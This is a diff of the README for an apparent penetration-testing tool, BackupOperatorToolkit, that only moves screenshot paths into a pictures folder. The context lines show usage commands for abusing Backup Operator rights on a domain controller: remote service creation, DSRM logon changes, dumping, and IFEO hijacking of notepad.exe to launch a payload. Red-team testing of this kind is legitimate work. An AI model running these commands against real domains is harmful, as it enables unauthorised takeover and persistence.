@@ -15,7 +15,7 @@ It is not possible to have the service executed immediately as the service contr
 .\BackupOperatorToolkit.exe SERVICE \\PATH\To\Service.exe \\TARGET.DOMAIN.DK SERVICENAME DISPLAYNAME DESCRIPTION
 ```  
 
-![service](./service.png)  
+![service](./pictures/service.png)  
   
 ### DSRM Mode  
 
@@ -29,7 +29,7 @@ If the DUMP mode has been used and the DSRM account has been cracked offline, se
 .\BackupOperatorToolkit.exe DSRM \\TARGET.DOMAIN.DK 0||1||2
 ```  
 
-![dsrm](./dsrm.png)  
+![dsrm](./pictures/dsrm.png)  
 
 ### DUMP Mode  
 
@@ -41,7 +41,7 @@ This mode is inspired by the [BackupOperatorToDA](https://github.com/mpgn/Backup
 .\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK
 ```  
 
-![dump](./dump.png)  
+![dump](./pictures/dump.png)  
   
 ### IFEO Mode  
 
@@ -53,7 +53,7 @@ The executable will be running as a child to the WerFault.exe process.
 .\BackupOperatorToolkit.exe IFEO notepad.exe \\Path\To\pwn.exe \\TARGET.DOMAIN.DK
 ```  
 
-![ifeo](./ifeo.png)  
-![ifeo-msf](./ifeo-msf.png)  
-![ifeo-msf-s](./ifeo-msf-s.png)  
-![ifeo-pwned](./ifeo-pwned.png)  
+![ifeo](./pictures/ifeo.png)  
+![ifeo-msf](./pictures/ifeo-msf.png)  
+![ifeo-msf-s](./pictures/ifeo-msf-s.png)  
+![ifeo-pwned](./pictures/ifeo-pwned.png)  
